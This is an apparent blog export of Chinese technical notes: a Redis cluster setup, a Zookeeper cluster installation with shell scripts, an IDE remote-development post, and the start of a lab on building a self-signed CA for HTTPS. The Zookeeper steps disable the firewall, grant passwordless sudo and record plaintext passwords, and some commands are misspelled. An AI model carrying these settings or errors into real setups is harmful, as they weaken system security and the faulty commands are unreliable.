<h4 id="机器启动-2"><a href="#机器启动-2" class="headerlink" title="机器启动"></a>机器启动</h4><p>6 个 Redis 服务分别启动成功之后，这时虽然配置了集群开启，但是这六台机器还是独立的。使用集群管理命令将这 6 台机器添加到一个集群中。</p>
<p>借助 redis-tri.rb 工具可以快速的部署集群。</p>
<p>只需要执行<code>redis-trib.rb create --replicas 1 192.168.1.11:6379 192.168.1.21:6379 192.168.1.12:6379 192.168.1.22:6379 192.168.1.13:6379 192.168.1.23:6379</code>就可以成功创建集群。</p>
<p>该命令执行创建完成后会有响应的日志，通过相关的日志就可以看出集群中机器的关系（不一定和上图对应），执行的日志如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Performing <span class="built_in">hash</span> slots allocation on 6 nodes...</span></span><br><span class="line">Master[0] -&gt; Slots 0 - 5460</span><br><span class="line">Master[1] -&gt; Slots 5461 - 10922</span><br><span class="line">Master[2] -&gt; Slots 10923 - 16383</span><br><span class="line">Adding replica 192.168.1.21:6379 to 192.168.1.11:6379</span><br><span class="line">Adding replica 192.168.1.22:6379 to 192.168.1.12:6379</span><br><span class="line">Adding replica 192.168.1.23:6379 to 192.168.1.13:6379</span><br><span class="line">M: 80c80a3f3e33872c047a8328ad579b9bea001ad8 192.168.1.11:6379   slots:[0-5460] (5461 slots) master</span><br><span class="line">S: b4d3eb411a7355d4767c6c23b4df69fa183ef8bc 192.168.1.21:6379   replicates 6788453ee9a8d7f72b1d45a9093838efd0e501f1</span><br><span class="line">M: 4d74ec66e898bf09006dac86d4928f9fad81f373 192.168.1.12:6379   slots:[5461-10922] (5462 slots) master</span><br><span class="line">S: b6331cbc986794237c83ed2d5c30777c1551546e 192.168.1.22:6379   replicates 80c80a3f3e33872c047a8328ad579b9bea001ad8</span><br><span class="line">M: 6788453ee9a8d7f72b1d45a9093838efd0e501f1 192.168.1.13:6379   slots:[10923-16383] (5461 slots) master</span><br><span class="line">S: 277daeb8660d5273b7c3e05c263f861ed5f17b92 192.168.1.23:6379   replicates 4d74ec66e898bf09006dac86d4928f9fad81f373</span><br><span class="line">Can I set the above configuration? (type &#x27;yes&#x27; to accept): yes                  #输入yes，接受上面配置</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Nodes configuration updated</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Assign a different config epoch to each node</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Sending CLUSTER MEET messages to <span class="built_in">join</span> the cluster</span></span><br></pre></td></tr></table></figure>

<p>执行完成后自动生成配置的 redis-cluster.conf 文件。</p>
<p>登录集群：<code>redis-cli -c -h 192.168.1.11 -p 6379 -a 123456                  # -c，使用集群方式登录</code>。</p>
<p>查看集群信息：<code>192.168.1.11:6379&gt; CLUSTER INFO                   #集群状态</code>。</p>
<p>列出节点信息：<code>192.168.1.11:6379&gt; CLUSTER NODES                  #列出节点信息</code>。</p>
<p>添加数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.11:6379&gt; set name aaa</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">Redirected to slot [13680] located at 192.168.1.13:6379                <span class="comment">#说明最终将数据写到了192.168.1.13:6379上</span></span></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>获取数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.11:6379&gt; get name</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">Redirected to slot [13680] located at 192.168.1.13:6379                <span class="comment">#说明最终到192.168.1.13:6379上读数据</span></span></span><br><span class="line">&quot;aaa&quot;</span><br></pre></td></tr></table></figure>

<h4 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h4><p>在 Redis 的每一个节点上，都有这么两个东西，一个是插槽（slot），它的的取值范围是：0-16383，可以从上面<code>redis-trib.rb</code>执行的结果看到这 16383 个 slot 在三个 master 上的分布。还有一个就是 cluster，可以理解为是一个集群管理的插件，类似的哨兵。</p>
<p>当我们的存取的 Key 到达的时候，Redis 会根据 crc16 的算法对计算后得出一个结果，然后把结果和 16384 求余数，这样每个 key 都会对应一个编号在 0-16383 之间的哈希槽，通过这个值，去找到对应的插槽所对应的节点，然后直接自动跳转到这个对应的节点上进行存取操作。</p>
<p>当数据写入到对应的 master 节点后，这个数据会同步给这个 master 对应的所有 slave 节点。</p>
<p>为了保证高可用，redis-cluster 集群引入了主从模式，一个主节点对应一个或者多个从节点。当其它主节点 ping 主节点 master1 时，如果半数以上的主节点与 master1 通信超时，那么认为 master1 宕机了，就会启用 master 1 的从节点 slave1，将 slave1 变成主节点继续提供服务。</p>
<p>如果 master1 和它的从节点 slave1 都宕机了，整个集群就会进入 fail 状态，因为集群的 slot 映射不完整。如果集群超过半数以上的 master 挂掉，无论是否有 slave，集群都会进入 fail 状态。</p>
<p>redis-cluster 采用去中心化的思想，没有中心节点的说法，客户端与 Redis 节点直连，不需要中间代理层，客户端不需要连接集群所有节点，连接集群中任何一个可用节点即可。</p>
<h4 id="集群扩缩容"><a href="#集群扩缩容" class="headerlink" title="集群扩缩容"></a>集群扩缩容</h4><p>对 redis 集群的扩容就是向集群中添加机器，缩容就是从集群中删除机器，并重新将 16383 个 slots 分配到集群中的节点上（数据迁移）。</p>
<p>扩缩容也是使用集群管理工具 redis-tri.rb。</p>
<p>扩容时，先使用<code>redis-tri.rb add-node</code>将新的机器加到集群中，这是新机器虽然已经在集群中了，但是没有分配 slots，依然是不起做用的。在使用 <code> redis-tri.rb reshard</code>进行分片重哈希（数据迁移），将旧节点上的 slots 分配到新节点上后，新节点才能起作用。</p>
<p>缩容时，先要使用 <code> redis-tri.rb reshard</code>移除的机器上的 slots，然后使用<code>redis-tri.rb add-del</code>移除机器。</p>
<h4 id="集群模式的优缺点"><a href="#集群模式的优缺点" class="headerlink" title="集群模式的优缺点"></a>集群模式的优缺点</h4><h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><p>采用去中心化思想，数据按照 slot 存储分布在多个节点，节点间数据共享，可动态调整数据分布;</p>
<p>可扩展性：可线性扩展到 1000 多个节点，节点可动态添加或删除。</p>
<p>高可用性：部分节点不可用时，集群仍可用。通过增加 Slave 做 standby 数据副本，能够实现故障自动 failover，节点之间通过 gossip 协议交换状态信息，用投票机制完成 Slave 到 Master 的角色提升。</p>
<p>降低运维成本，提高系统的扩展性和可用性。</p>
<h5 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h5><p>1.Redis Cluster 是无中心节点的集群架构，依靠 Goss 协议（谣言传播）协同自动化修复集群的状态</p>
<p>但 GosSIp 有消息延时和消息冗余的问题，在集群节点数量过多的时候，节点之间需要不断进行 PING&#x2F;PANG 通讯，不必须要的流量占用了大量的网络资源。虽然 Redis4.0 对此进行了优化，但这个问题仍然存在。</p>
<p>2.数据迁移问题</p>
<p>Redis Cluster 可以进行节点的动态扩容缩容，这一过程，在目前实现中，还处于半自动状态，需要人工介入。在扩缩容的时候，需要进行数据迁移。</p>
<p>而 Redis 为了保证迁移的一致性，迁移所有操作都是同步操作，执行迁移时，两端的 Redis 均会进入时长不等的阻塞状态，对于小 Key，该时间可以忽略不计，但如果一旦 Key 的内存使用过大，严重的时候会接触发集群内的故障转移，造成不必要的切换。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>主从模式：master 节点挂掉后，需要手动指定新的 master，可用性不高，基本不用。</p>
<p>哨兵模式：master 节点挂掉后，哨兵进程会主动选举新的 master，可用性高，但是每个节点存储的数据是一样的，浪费内存空间。数据量不是很多，集群规模不是很大，需要自动容错容灾的时候使用。</p>
<p>集群模式：数据量比较大，QPS 要求较高的时候使用。 <strong>Redis Cluster 是 Redis 3.0 以后才正式推出，时间较晚，目前能证明在大规模生产环境下成功的案例还不是很多，需要时间检验。</strong></p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Zookeeper</title>
    <url>/2021/12/21/Zookeeper/</url>
    <content><![CDATA[<h1 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h1><ul>
<li><p>zookeeper&#x3D;文件系统+通知机制</p>
</li>
<li><p>一个leader多个follower组成的集群</p>
</li>
<li><p>集群只要半数以上节点存活，Zookeeper集群就能正常服务，适合安装奇数台服务器，偶数会浪费</p>
</li>
<li><p>全局数据一致:每个Server保存一份相同的数据副本，Client无论连接到哪个Server，数据都是一致的。 </p>
</li>
<li><p>更新请求顺序执行，来自同一个Client的更新请求按其发送顺序依次执行。 </p>
</li>
<li><p>数据更新原子性，一次数据更新要么成功，要么失败。 </p>
</li>
<li><p>实时性，在一定时间范围内，Client能读到最新数据。</p>
</li>
</ul>
<p>每一个 ZNode 默认能够存储 1MB 的数据，每个 ZNode 都可以通过 其路径唯一标识。</p>
<h2 id="Zookeeper本地安装"><a href="#Zookeeper本地安装" class="headerlink" title="Zookeeper本地安装"></a>Zookeeper本地安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[hmw@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop100</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建huang用户</span></span><br><span class="line">[hmw@hadoop100 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop100 ~]$ passwd huang</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root和hmw密码hmw，huang密码yc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置hmw用户具有root权限</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在%wheel  ALL=(ALL) ALL这行下面添加一行</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组，你先配置了huang具有免密功能，但是程序执行到%wheel行时，该功能又被覆盖回需要密码。所以huang要放到%wheel这行下面。</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看这两个文件的所有者和所有属组</span></span><br><span class="line">[hmw@hadoop100 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop100 ~]$ ll</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载虚拟机自带的JDK</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rpm-qa:查询所安装的所有rpm软件包</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">grep -i:忽略大小写</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">xargs -n1:表示每次只传递一个参数</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rpm -e –nodeps:强制卸载软件</span></span><br><span class="line">[hmw@hadoop100 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启</span></span><br><span class="line">[hmw@hadoop100 ~]$ reboot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改hostname</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改hosts</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hosts</span><br><span class="line">10.211.55.13 hadoop102</span><br><span class="line">10.211.55.14 hadoop103</span><br><span class="line">10.211.55.15 hadoop104</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置免密登录</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1. 判断参数个数</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2. 遍历集群所有机器</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">3. 遍历所有目录，挨个发送</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">4. 判断文件是否存在</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. 获取父目录</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. 获取当前文件的名称 </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改脚本xsync具有执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启</span></span><br><span class="line">[huang@hadoop100 ~]$ reboot</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装jdk</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果用了sudo，那么xsync一定要给它的路径补全</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同步环境变量配置（root所有者）</span></span><br><span class="line">sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/是指根目录：就是所有目录最顶层的目录。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">./表示当前目录，./ 一般需要和其他文件夹或者文件结合使用，指代当前目录下的东西。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让新的环境变量生效</span></span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装Zookeeper</span></span><br><span class="line">tar -zxvf apache-zookeeper-3.5.7-bin.tar.gz -C /opt/module/</span><br><span class="line">mv apache-zookeeper-3.5.7-bin/ zookeeper-3.5.7</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/tmp 目录存的是临时数据，一个月可能会被删除</span></span><br><span class="line">mkdir zkData</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在/opt/module/zookeeper-3.5.7/zkData 目录下创建一个 myid 的文件</span></span><br><span class="line">vi myid</span><br><span class="line">2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同步，并分别在 hadoop103、hadoop104 上修改 myid 文件中内容为 3、4</span></span><br><span class="line">xsync zookeeper-3.5.7</span><br><span class="line"></span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">vim zoo.cfg</span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######################cluster########################## server.2=hadoop102:2888:3888</span></span></span><br><span class="line">server.3=hadoop103:2888:3888</span><br><span class="line">server.4=hadoop104:2888:3888</span><br><span class="line"></span><br><span class="line">xsync zoo.cfg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动（3台都要启动）</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写启动停止脚本</span></span><br><span class="line">vim zk.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i 启动 ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh start&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i 停止 ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">&quot;status&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i 状态 ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh status&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">chmod u+x zk.sh</span><br><span class="line">zk.sh start</span><br><span class="line">zk.sh stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">jpsall脚本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="选举机制"><a href="#选举机制" class="headerlink" title="选举机制"></a>选举机制</h2><p>应答数超过半数就是回复成功</p>
<h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>CountDownLatch 应用场景</p>
<p>典型的应用场景就是当一个服务启动时，同时会加载很多组件和服务，这时候主线程会等待组件和服务的加载。当所有的组件和服务都加载完毕后，主线程和其他线程在一起完成某个任务。</p>
<p>CountDownLatch 还可以实现学生一起比赛跑步的程序，CountDownLatch 初始化为学生数量的线程，鸣枪后，每个学生就是一条线程，来完成各自的任务，当第一个学生跑完全程后，CountDownLatch 就会减一，直到所有的学生完成后，CountDownLatch 会变为 0 ，接下来再一起宣布跑步成绩。</p>
<h4 id="Curator分布式锁框架"><a href="#Curator分布式锁框架" class="headerlink" title="Curator分布式锁框架"></a>Curator分布式锁框架</h4><h2 id="Paxos算法"><a href="#Paxos算法" class="headerlink" title="Paxos算法"></a>Paxos算法</h2><h2 id="Zab算法"><a href="#Zab算法" class="headerlink" title="Zab算法"></a>Zab算法</h2><ul>
<li><strong>序列化</strong>：把Java对象转换为字节序列。</li>
<li><strong>反序列化</strong>：把字节序列恢复为原先的Java对象。</li>
</ul>
<p>会存在本地磁盘</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>启动zookeeper时，感觉一切正常，但是通过zkServer.sh status查看状态时，发现报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error contacting service. It is probably not running.</span><br></pre></td></tr></table></figure>

<p>通过查看 zk&#x2F;logs下的文件，发现有如下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERROR [main:QuorumPeerMain@86] - Invalid config, exiting abnormally</span><br><span class="line">org.apache.zookeeper.server.quorum.QuorumPeerConfig$ConfigException: Address unresolved: node01:3888 </span><br><span class="line">	at org.apache.zookeeper.server.quorum.QuorumPeer$QuorumServer.&lt;init&gt;(QuorumPeer.java:242)</span><br><span class="line">	at org.apache.zookeeper.server.quorum.flexible.QuorumMaj.&lt;init&gt;(QuorumMaj.java:89)</span><br></pre></td></tr></table></figure>

<h2 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h2><p>在配置zoo.cfg文件时候，端口号后面还有空格。因为是从其他地方复制的，所以不容易发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.0=spark1:2888:3888(此处有空格)</span><br><span class="line">server.1=spark2:2888:3888</span><br><span class="line">server.2=spark3:2888:3888</span><br></pre></td></tr></table></figure>

<h2 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h2><p>删掉端口号后面的空格即可</p>
<p>有问题一定要先看日志</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>使用IDEA配合VSCode远程开发</title>
    <url>/2021/12/22/%E4%BD%BF%E7%94%A8Idea%E9%85%8D%E5%90%88vscode%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h1 id="使用IDEA配合VSCode远程开发"><a href="#使用IDEA配合VSCode远程开发" class="headerlink" title="使用IDEA配合VSCode远程开发"></a>使用IDEA配合VSCode远程开发</h1><h2 id="IDEA配置远程上传代码"><a href="#IDEA配置远程上传代码" class="headerlink" title="IDEA配置远程上传代码"></a>IDEA配置远程上传代码</h2><p>先确保本地和开发机上有同一份代码。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212343408.png" alt="image-20211221234331366"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212344773.png" alt="image-20211221234439734"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212346351.png" alt="image-20211221234657302"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212358451.png" alt="image-20211221235744141"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220003470.png" alt="image-20211222000346432"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220005712.png" alt="image-20211222000526639"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220006550.png" alt="image-20211222000619501"></p>
<h2 id="VsCode远程调试"><a href="#VsCode远程调试" class="headerlink" title="VsCode远程调试"></a>VsCode远程调试</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220009126.png" alt="image-20211222000914072"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220010818.png" alt="image-20211222001022768"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220011260.png" alt="image-20211222001153213"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220013399.png" alt="image-20211222001322347"></p>
<p>需要升级git版本</p>
<p><a href="https://www.cnblogs.com/miskis/p/9816135.html">VsCode搭建Java开发环境</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全实践Lab1-自建CA证书搭建https服务器</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab1-%E8%87%AA%E5%BB%BACA%E8%AF%81%E4%B9%A6%E6%90%AD%E5%BB%BAhttps%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="信息安全实践Lab1-自建CA证书搭建https服务器"><a href="#信息安全实践Lab1-自建CA证书搭建https服务器" class="headerlink" title="信息安全实践Lab1-自建CA证书搭建https服务器"></a>信息安全实践Lab1-自建CA证书搭建https服务器</h1><h2 id="搭建https服务器"><a href="#搭建https服务器" class="headerlink" title="搭建https服务器"></a>搭建https服务器</h2><p>本机环境： Ubuntu 20.04  OpenSSL 1.1.1f Firefox Browser 79.0(64-bit)</p>
<h3 id="安装OpenSSL"><a href="#安装OpenSSL" class="headerlink" title="安装OpenSSL"></a>安装OpenSSL</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo apt-get install openssl</span></span><br></pre></td></tr></table></figure>

<h3 id="自建CA"><a href="#自建CA" class="headerlink" title="自建CA"></a>自建CA</h3><p>建立myCA目录用于存放CA相关信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd &amp;&amp; mkdir -p myCA/signedcerts &amp;&amp; mkdir myCA/private &amp;&amp; cd myCA</span><br></pre></td></tr></table></figure>

<p>myCA 用于存放 CA 根证书，证书数据库，以及后续服务器生成的证书，密钥以及请求<br>signedcerts:保存签名证书的 copy<br>private: 包含私钥</p>
<p>配置myCA相关参数，在myCA目录下进行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;01&#x27;&gt;serial &amp;&amp; touch index.txt</span><br></pre></td></tr></table></figure>

<p>创建caconfig.cnf文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vim</span><br><span class="line">vim ~/myCA/caconfig.cnf</span><br></pre></td></tr></table></figure>

<p>caconfig.cnf文件内容如下：</p>
<p>注意文件中两个地方的username需要换成你自己的用户名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">My sample caconfig.cnf file.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default configuration to use when one is not provided on the command line.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ ca ]</span></span><br><span class="line">default_ca      = local_ca</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default location of directories and files needed to generate certificates.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ local_ca ]</span></span><br><span class="line">dir             = /home/username/myCA                    # 这里要将username替换为你的用户名</span><br><span class="line">certificate     = $dir/cacert.pem</span><br><span class="line">database        = $dir/index.txt</span><br><span class="line">new_certs_dir   = $dir/signedcerts</span><br><span class="line">private_key     = $dir/private/cakey.pem</span><br><span class="line">serial          = $dir/serial</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default expiration and encryption policies for certificates.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">default_crl_days        = 365</span></span><br><span class="line">default_days            = 1825</span><br><span class="line">default_md              = SHA256</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> </span>     </span><br><span class="line">policy          = local_ca_policy</span><br><span class="line">x509_extensions = local_ca_extensions</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> </span>     </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default policy to use when generating server certificates.  The following</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">fields must be defined <span class="keyword">in</span> the server certificate.</span></span><br><span class="line"><span class="meta prompt_">#</span><span 